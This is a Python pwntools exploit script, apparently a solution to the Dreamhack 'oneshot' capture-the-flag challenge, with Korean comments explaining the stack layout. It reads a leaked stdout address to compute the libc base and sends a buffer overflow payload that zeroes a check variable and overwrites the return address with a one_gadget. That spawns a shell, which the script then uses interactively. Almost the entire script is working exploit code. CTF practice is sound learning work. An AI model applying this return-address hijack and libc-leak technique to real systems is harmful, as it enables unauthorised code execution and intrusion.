from pwn import *
def slog(name, addr):
	return success(": ".join([name, hex(addr)]))

context.log_level = 'debug'
context.arch = 'amd64'

# Local
# p = process('./oneshot')

# Online

HOST = int(input("Input Host #: "))
PORT = int(input("Input Port #: "))
p = remote("host" + str(HOST) + ".dreamhack.games", PORT)


elf = ELF('./oneshot')
libc = ELF('./libc6_2.23-0ubuntu11.3_amd64.so')
# 주어진 libc와 서버는 다를 수 있으니 주의

p.recvuntil("stdout: ")
stdout_addr = int(p.recv(14), 16)
stdout_offset = libc.symbols['_IO_2_1_stdout_']
libc_base = stdout_addr - stdout_offset
oneshot_list = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
# 구해낸 oneshot은 offset이 주어지니 libc_base 구하는 과정 필요
oneshot = libc_base + oneshot_list[0]
slog("stdout_addr", stdout_addr)
slog("stdout_offset", stdout_offset)
slog("libc_base", libc_base)
slog("oneshot", oneshot)

payload = b"A" * (0x20 - 0x08) + p64(0) + b"B" * 0x08 + p64(oneshot)
# lea rax, [rbp-0x20]과 mov [rbp-0x08], 0x0을 통해
# msg(0x18), check(0x08), rbp, rtn 순서로 스택이 쌓인 것을 알 수 있다
# rtn addr를 oneshot으로 덮어준다
p.recvuntil("MSG: ")
p.sendline(payload)

p.interactive()
